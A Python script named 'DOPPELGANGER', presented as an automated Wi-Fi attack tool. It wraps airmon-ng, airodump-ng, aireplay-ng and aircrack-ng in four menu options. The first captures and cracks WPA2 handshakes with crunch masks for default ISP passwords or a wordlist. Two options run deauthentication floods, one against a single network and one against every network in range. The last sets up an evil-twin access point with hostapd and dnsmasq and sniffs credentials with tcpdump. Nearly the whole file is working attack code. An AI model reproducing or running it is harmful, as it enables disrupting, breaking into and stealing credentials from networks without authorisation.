import os
import csv
import subprocess
from pyfiglet import Figlet
import shlex
import time

if not 'SUDO_UID' in os.environ.keys():
	print('RUN THIS ON ROOT')
	exit()

interface = "wlxc01c300da4c9"
potential_targets = []


def check_for_ssid (essid, lst):
    check_status = True

    if len(lst) == 0:
        return check_status


    for item in lst:
        if essid in item["ESSID"]:
            check_status = False

    return check_status



def monitor_mode():

    check_kill = "sudo airmon-ng check kill"
    mntr_cmd = f"sudo airmon-ng start {interface}"
    ret_check_kill = subprocess.run(shlex.split(check_kill), stdout=subprocess.DEVNULL)
    ret_code = subprocess.run(shlex.split(mntr_cmd), stdout=subprocess.DEVNULL)
    if ret_code.returncode == 0:
        print("[+] STARTING MONITOR MODE...SUCCESS!")
    else:
        print("\n[-] STARTING MONITOR MODE...ERROR")
        print("[*] TRY TURNING OF YOUR MONITOR MODE MANUALLY!!!")
        exit()

def scan_target_output():

    scan_for_targets = "airodump-ng --band abg -w file --output-format csv wlan1mon"

    seconds = int(input("[*]ENTER WIFI SCAN DURATION IN SECONDS: "))
    print("[*] SCANNING FOR TARGETS...")
    proc = subprocess.Popen(shlex.split(scan_for_targets), stdout=subprocess.DEVNULL)
    time.sleep(seconds)
    kill_scan = "killall airodump-ng"
    proc_kill = subprocess.run(shlex.split(kill_scan))

    if proc_kill.returncode == 0:
        print("[+] SCANNING COMPLETE...\n")

    
    fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']


    with open('file-01.csv') as targets:
        reader = csv.DictReader(targets, fieldnames=fieldnames)
        for row in reader:
            if row['BSSID'] == "BSSID":
                pass
            elif row['BSSID'] == "Station MAC":
                break
            elif row['channel'] == "channel":
                pass
            elif row['channel'] == "power":
                break
            elif check_for_ssid(row['ESSID'], potential_targets):
                potential_targets.append(row)



    for index, item in enumerate(potential_targets):
        print(f"\t[+] TARGET:{index}\tMAC: {item['BSSID']}\tCHANNEL: {item['channel'].strip()}\tESSID: {item['ESSID']}")
        time.sleep(0.5)
    
    print("\n[*] NOTE: NULL ESSIDs ARE PROBABLY 5GHz NETWORKS")


os.system("clear")
custom_fig = Figlet(font='slant')
print(custom_fig.renderText('DOPPELGANGER'))
print("[Automated Wifi Attack Script]\t\t\t\t[Author: J.E.D]\n")

print("-----------------------------[SELECT AN OPTION]-----------------------------\n")
print("[1] WIFI cracker")
print("[2] Single Deauthentication Attack")
print("[3] AOF Deauthentication Attack (Area Of Effect)")
print("[4] Evil Twin Attack")

option = input("\n[*]Select option: ")
if option == '1':
    print("[*]SELECTED: WIFI cracker")
    monitor_mode()

    scan_target_output()


    while True:
        choice = input("\n[*] SELECT TARGET > ")
        try:
            if potential_targets[int(choice)]:
                break
        except:
            print("[*] Target does not exist, please try again")


    trgt_bssid = potential_targets[int(choice)]["BSSID"]
    trgt_channel = potential_targets[int(choice)]["channel"]
    trgt_name = potential_targets[int(choice)]["ESSID"]



    airodump_cmd = f"sudo airodump-ng -w target -c {trgt_channel} --bssid {trgt_bssid} wlan1mon"
    aireplay_cmd = f"sudo aireplay-ng --deauth 10 -a {trgt_bssid} -D wlan1mon"



    print("[+] RUNNING AIRODUMP ON TARGET...")
    
    ret_airodump = subprocess.Popen(f"sudo xterm -hold -e {airodump_cmd}",shell=True)
    print("[+] KICKING ALL CLIENTS ON TARGET...")
    ret_aireplay = subprocess.Popen(f"sudo xterm -hold -e {aireplay_cmd}",shell=True)
    time.sleep(15)
    kill_xterm = subprocess.run("sudo killall xterm", shell=True)

    if kill_xterm.returncode !=0:
        print("[-]ERROR WHILE TRYING TO TERMINATE XTERM AIRODUMP AND AIREPLAY SESSION!!!")
    else:
        print("[+] KILLING AIRODUMP...SUCCESS!")
        print("[+] KILLING AIREPLAY...SUCCESS!")




    find_file = "find . -type f -name '*.cap'"
    exec_find = subprocess.run(shlex.split(find_file), capture_output=True)
    output = exec_find.stdout.decode()

    cracking_mode = ""
    print("\n------------------[CRACKING MODE]------------------")
    print("[1] DEFAULT PLDT")
    print("[2] DEFAULT GLOBE")
    print("[3] CUSTOM WORDLIST")


    select_mode = int(input("[*]SELECT CRACKING MODE:"))

    if select_mode == 1:
        cracking_mode = f"crunch 13 13 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 -t PLDTWIFI@@@@@ | sudo aircrack-ng -e {trgt_name} -w - {output}"
    elif select_mode == 2:
        cracking_mode = f"crunch 8 8 ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 -i | sudo aircrack-ng -e {trgt_name} -w - {output}"
    elif select_mode == 3:
        cracking_mode = f"sudo aircrack-ng {output} -w /usr/share/wordlists/rockyou.txt"
    else:
        print("[-]INVALID OPTION...EXITING!!!")
        mntr_exit = f"airmon-ng stop wlan1mon"
        del_csv = "rm -f file-01.csv"
        subprocess.run(shlex.split(mntr_exit), stdout=subprocess.DEVNULL)
        subprocess.run(shlex.split(del_csv))
        exit()


    try:
        
        crack_ret_code = subprocess.Popen(cracking_mode, shell=True)
        
        if crack_ret_code.returncode != 0:
            print("[-] UNABLE TO CRACK WPA2 HANDSHAKE!!!")
    except KeyboardInterrupt:
        print("[+]CRACKING ABORTED, HANDSHAKE STORED FOR LATER USE...")

    subprocess.run("sudo rm -f target-01.csv target-01.kismet.csv target-01.kismet.netxml target-01.log.csv", shell=True)







elif option == '2':
    print("[*]SELECTED: Single Deauthentication Attack")
    monitor_mode()
    scan_target_output()

    while True:
        choice = input("\n[*] SELECT TARGET > ")
        try:
            if potential_targets[int(choice)]:
                break
        except:
            print("[*] Target does not exist, please try again")

    trgt_bssid = potential_targets[int(choice)]["BSSID"]
    trgt_channel = potential_targets[int(choice)]["channel"]
    

    airodump_cmd = f"sudo airodump-ng --bssid {trgt_bssid} --channel {trgt_channel} wlan1mon"
    aireplay_cmd = f"sudo aireplay-ng --deauth 0 -a {trgt_bssid} -D wlan1mon"

    try:
        print("\n[+] KICKING ALL CLIENTS ON TARGET...")
        print("[+] PRESS CTRL + C TO TERMINATE DEAUTHENTICATION ATTACK...")
        ret_airodump = subprocess.Popen(f"sudo xterm -hold -e {airodump_cmd}",shell=True, stdout=subprocess.DEVNULL)
        ret_aireplay = subprocess.Popen(f"sudo xterm -hold -e {aireplay_cmd}",shell=True, stdout=subprocess.DEVNULL)

        while True:
            print(f"[+] SENDING DEAUTHENTICATION PACKETS TO TARGET: {trgt_bssid}")
            time.sleep(1)

    except KeyboardInterrupt:
        print("[+] ATTACK TERMINATED!!!")






elif option == "3":
    print("[*]SELECTED: AOF Deauthentication Attack")
    duration = int(input("[*]ENTER DURATION OF DEAUTHENTICATION ATTACK IN SECONDS: "))
    monitor_mode()

    scan_target_output()


    for target in potential_targets:

        airodump = f"sudo airodump-ng --bssid {target['BSSID']} --channel {target['channel'].strip()} wlan1mon"
        aireplay = f"sudo aireplay-ng --deauth 0 -a {target['BSSID']} -D wlan1mon"
        #xterm_airodump = (f"sudo xterm -hold -e {airodump}")

        xterm_airodump = subprocess.Popen(f"sudo xterm -hold -e {airodump}",shell=True)
        xterm_aireplay = subprocess.Popen(f"sudo xterm -hold -e {aireplay}",shell=True)

        print("[+] RUNNING DEAUTHENTICATION ATTACK... JAMMING ALL WIFI ROUTERS")

    time.sleep(duration)

    kill_xterm = "sudo killall xterm"

    proc = subprocess.run(shlex.split(kill_xterm), stdout=subprocess.DEVNULL)

    if proc.returncode == 0:
        print("[+] DEAUTHENTICATION SUCCESSFULLY TERMINATED")







elif option == "4":
    print("[*]SELECTED: Evil Twin Attack")
    monitor_mode()

    scan_target_output()

    
    while True:
        target_deauth = input("[*]SELECT TARGET TO CLONE AND DEAUTHENTICATE >> ")
        try:
            if potential_targets[int(target_deauth)]:
                break
        except:
            print("[-]TARGET DOES NOT EXIST ON INDEX!!! Please try again")

    trgt_essid = potential_targets[int(target_deauth)]["ESSID"]
    trgt_channel = potential_targets[int(target_deauth)]["channel"]
    trgt_bssid = potential_targets[int(target_deauth)]["BSSID"]            ### <-------------TARGET INDEX----------------

    print(f"[+]STARTING ATTACK...TARGET ESSID: {trgt_essid}")

    wlan0_monitor= "sudo airmon-ng start wlan0"    ######## <-------STARTING MONITOR MODE FOR wlan0 interface (Built-in for laptop)

    print("[*]STARTING MONITOR MODE ON INTERFACE: wlan0")

    ret_wlan0_monitor = subprocess.run(shlex.split(wlan0_monitor), stdout=subprocess.DEVNULL)

    if ret_wlan0_monitor.returncode != 0:
        print("[-]ERROR ON TRYING TO START MONITOR MODE FOR INTERFACE: wlan0")
        exit()
    else:
        print("[+]MONITOR MODE SUCCESS")

    hostapd_config = ["interface=wlan0mon\n",f"ssid={trgt_essid}\n","channel=8\n","driver=nl80211"]
    dnsmasq_config = ["interface=wlan0mon\n","dhcp-range=192.168.1.2,192.168.1.250,12h\n","dhcp-option=3,192.168.1.1\n","dhcp-option=6,192.168.1.1\n","address=/#/192.168.1.1"]

    print("[*]CREATING HOSTAPD CONFIGURATION FILE...")

    hostapd_file = open("hostapd.conf", "w")
    hostapd_file.writelines(hostapd_config)
    hostapd_file.close()

    print("[*]CREATING DNSMASQ CONFIGURATION FILE...")

    dnsmasq_file = open("dnsmasq.conf", "w")
    dnsmasq_file.writelines(dnsmasq_config)
    dnsmasq_file.close()

    assign_ip_wlan0_mon = "sudo ifconfig wlan0mon 192.168.1.1/24"       #### <---------ASSIGNING STATIC IP ADDRESS TO wlan0mon INTERFACE---------

    run_assign_ip = subprocess.run(shlex.split(assign_ip_wlan0_mon), stdout=subprocess.DEVNULL)

    if run_assign_ip.returncode != 0:
        print("[-]ERROR OCCURED WHILE TRYING TO ASSIGN STATIC IP ON INTERFACE: wlan0mon")
        exit()
    else:
        print("[+]ASSIGNING IP 192.168.1.1/24 ON INTERFACE: wlan0mon...SUCCESS!!!")


    run_apache_server = "sudo service apache2 start"                    #### <----------STARTING APACHE2 SERVER----------

    ret_run_apache = subprocess.run(shlex.split(run_apache_server), stdout=subprocess.DEVNULL)

    if ret_run_apache.returncode != 0:
        print("[-]ERROR WHILE TRYING TO RUN APACHE SERVER!!!")
        exit()
    else:
        print("[+]RUNNING APACHE SERVER...SUCCESS!!!")


    run_dnsmasq = "sudo dnsmasq -C dnsmasq.conf"            ### <------------RUN DNSMASQ DAEMON ON BACKGROUND--------

    ret_run_dnsmasq = subprocess.run(shlex.split(run_dnsmasq), stdout=subprocess.DEVNULL)

    if ret_run_dnsmasq.returncode != 0:
        print("[-]ERROR WHILE TRYING TO RUN DNSMASQ DAEMON ON BACKGROUND!!!")
        exit()
    else:
        print("[+]RUNNING DNSMASQ DAEMON ON BACKGROUND...SUCCESS!!!")



    run_hostapd = "sudo hostapd hostapd.conf -B"               ### <-----------RUN HOSTAPD DAEMON ON BACKGROUND---------

    ret_run_hostapd = subprocess.run(shlex.split(run_hostapd), stdout=subprocess.DEVNULL)

    if ret_run_hostapd.returncode != 0:
        print("[-]ERROR WHILE TRYING TO RUN HOSTAPD DAEMON ON BACKGROUND!!!")
        exit()
    else:
        print("[+]RUNNING HOSTAPD DAEMON ON BACKGROUND...SUCCESS!!!")


    print("[+] EVERYTHING IS SET...DEAUTHENTICATING TARGET ROUTER")
    

    
    airodump_cmd = f"sudo airodump-ng --bssid {trgt_bssid} --channel {trgt_channel} wlan1mon"

    subprocess.Popen(f"sudo xterm -hold -e {airodump_cmd}", shell=True)


    print("[+]AIRODUMP ON TARGET RUNNING ON BACKGROUND...")
    

    aireplay_cmd = f"sudo aireplay-ng --deauth 0 -a {trgt_bssid} wlan1mon"       ### <------------DEAUTHENTICATION ATTACK--------------

    subprocess.Popen(f"sudo xterm -hold -e {aireplay_cmd}", shell=True)

    print("[+]DEAUTHENTICATION ATTACK IS NOW RUNNING IN BACKGROUND...")

    run_tcpdump = "sudo tcpdump --interface=wlan0mon port http or port ftp or port smtp or port imap or port pop3 or port telnet -lA | egrep -i -B5 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd= |password=|pass:|user:|username:|password:|login:|pass |user '"

    print("[+]RUNNING TCPDUMP...SNIFFING CREDENTIALS")
    print("[+]PRESS CTRL + C TO KILL THE ATTACK...")

    try:
        while True:
            subprocess.run("sudo tcpdump -i wlan0mon -s 0 -A -n -l | egrep --ignore-case 'POST /|pwd=|passwd=|password='", shell=True)
    except KeyboardInterrupt:
        commands = ['dnsmasq', 'hostapd', 'apache2']

        for i in commands:
            ret = subprocess.run(f"sudo killall {i}", shell=True, stdout=subprocess.DEVNULL)
            if ret.returncode != 0:
                print(f"[-]ERROR OCCURED WHILE TRYING TO KILL PROCESS: {i}")
            else:
                print(f"[+]KILLING PROCESS: {i}...SUCCESS!!!")

    del_dnsmasq_hostapd = subprocess.run("sudo rm -f dnsmasq.conf && sudo rm -f hostapd.conf", shell=True)

    if del_dnsmasq_hostapd.returncode !=0:
        print("[-]ERROR OCCURED WHILE TRYING TO DELETE DNSMASQ AND HOSTAPD CONFIGURATION FILE!!!")
    else:
        print("[+]CONFIGURATION FILE DELETION SUCCESS!!!")

    subprocess.run(shlex.split("sudo airmon-ng check kill"), stdout=subprocess.DEVNULL)
    subprocess.run(shlex.split("sudo ifconfig wlan0mon down"), stdout=subprocess.DEVNULL)
    subprocess.run(shlex.split("sudo ip link set wlan0mon name wlan0"), stdout=subprocess.DEVNULL)
    subprocess.run(shlex.split("sudo ifconfig wlan0 up"), stdout=subprocess.DEVNULL)

    print("[+]PROCESS TERMINATION AND FILE DELETION SUCCESS!!!")






#kills monitor mode and deletes csv file
mntr_exit = f"airmon-ng stop wlan1mon"
del_csv = "rm -f file-01.csv"
subprocess.run(shlex.split(mntr_exit), stdout=subprocess.DEVNULL)
subprocess.run(shlex.split(del_csv))
subprocess.run(shlex.split("sudo service NetworkManager start"), stdout=subprocess.DEVNULL)










